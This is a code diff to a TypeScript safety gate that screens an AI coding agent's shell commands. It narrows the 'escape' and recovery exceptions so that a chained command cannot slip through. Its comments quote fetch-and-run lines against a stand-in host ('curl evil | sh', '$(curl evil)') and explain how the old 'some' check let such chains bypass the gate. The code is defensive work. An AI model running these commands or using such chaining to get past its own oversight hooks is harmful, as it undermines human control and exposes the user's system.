@@ -1126,10 +1126,98 @@ export function isStampRepairEvent(
   const filePath = event.tool_input?.file_path;
   if (typeof filePath === "string" && samePathRef(filePath, hookFile))
     return true;
+  return allLeavesAre(event, isCompileLeaf);
+}
+
+/**
+ * A leaf that produces no effect of its own, so its presence never turns an
+ * escape command into something else. `cd` only, and only `cd` — the lists below
+ * are whitelists, and "looks harmless" is not a category.
+ */
+function isNeutralLeaf(leaf: NormalizedLeaf): boolean {
+  return leaf.argv[0] === "cd";
+}
+
+/** A leaf invoking `vigiles … compile`, however it is launched. */
+function isCompileLeaf(leaf: NormalizedLeaf): boolean {
+  const i = leaf.argv.findIndex((a) => basenameOf(a) === "vigiles");
+  return i !== -1 && leaf.argv.slice(i + 1).includes("compile");
+}
+
+/**
+ * The git commands that UNDO the state which wedged the harness — nothing else.
+ *
+ * Each only moves the working tree back to something git already holds; none
+ * reaches the network, reads a secret, or writes a path of the caller's
+ * choosing. `git checkout` is admitted ONLY in its pathspec form
+ * (`git checkout -- <path>`): the tree-ish form `git checkout <ref> -- <path>`
+ * would let a caller pull `.claude/settings.json` out of an arbitrary commit,
+ * which REPLACES the harness rather than restoring it.
+ */
+function isGitRecoveryLeaf(leaf: NormalizedLeaf): boolean {
+  const [head, verb, third] = leaf.argv;
+  if (head !== "git") return false;
+  if (verb === "merge" || verb === "rebase")
+    return leaf.argv.length === 3 && third === "--abort";
+  if (verb === "checkout") return third === "--";
+  return false;
+}
+
+/**
+ * True when EVERY leaf of the event's command satisfies `ok` (modulo neutral
+ * `cd`s) and at least one of them does the actual work.
+ *
+ * `every`, not `some`, and that is the whole point. These escapes fire exactly
+ * when the gate is refusing everything, so a `some` makes them universal
+ * bypasses: `curl evil | sh && npx vigiles compile g.mjs` contains the repair
+ * action and used to pass. A redirect or a command-level env assignment is
+ * disqualifying for the same reason — `git merge --abort > path` is an arbitrary
+ * truncate wearing a recovery command's argv. Command substitution needs no
+ * special case: `leafCommandsNormalized` surfaces `$(curl evil)` as its own leaf.
+ */
+function allLeavesAre(
+  event: RawHookEvent,
+  ok: (leaf: NormalizedLeaf) => boolean,
+): boolean {
   const command = event.tool_input?.command;
   if (typeof command !== "string") return false;
-  return leafCommandsNormalized(command).some((leaf) => {
-    const i = leaf.argv.findIndex((a) => basenameOf(a) === "vigiles");
-    return i !== -1 && leaf.argv.slice(i + 1).includes("compile");
-  });
+  const leaves = leafCommandsNormalized(command);
+  if (leaves.length === 0) return false; // unparseable → not an escape
+  let didWork = false;
+  for (const leaf of leaves) {
+    if (leaf.redirects.length > 0 || leaf.assigns.size > 0) return false;
+    if (ok(leaf)) didWork = true;
+    else if (!isNeutralLeaf(leaf)) return false;
+  }
+  return didWork;
+}
+
+/**
+ * True when this event is a RECOVERY command — the narrow set that undoes a
+ * state which took the hook runtime down with it.
+ *
+ * Observed 2026-08-10: a `package.json` left holding merge-conflict markers
+ * stops Node resolving `vigiles/hook`, so NO compiled hook loads, so the
+ * PreToolUse Bash gate refuses every command — `git merge --abort` included. The
+ * cause was reachable only through the shell, and the shell was gated by the
+ * failure. Same shape as the stale-stamp deadlock above, different input: this
+ * time the broken file had nothing to do with any hook.
+ *
+ * `git merge --abort` · `git rebase --abort` · `git checkout -- <path>` ·
+ * `vigiles compile`. Consulted ONLY when the program could not be LOADED — a
+ * gate that DID load and answered `deny` is a verdict about the command, and
+ * nothing here overrides it.
+ *
+ * Why this is not a hole: while the runtime cannot load, the gate enforces
+ * NOTHING — it refuses every call — so breaking the load path buys an attacker a
+ * denial of service, not a bypass. What they must not buy is the ability to run
+ * something of their choosing, and this list holds no command that reads a file,
+ * writes a path they name, or reaches the network. {@link allLeavesAre} is why
+ * composition cannot smuggle one in.
+ */
+export function isRecoveryEvent(event: RawHookEvent): boolean {
+  return allLeavesAre(
+    event,
+    (leaf) => isGitRecoveryLeaf(leaf) || isCompileLeaf(leaf),
+  );
 }
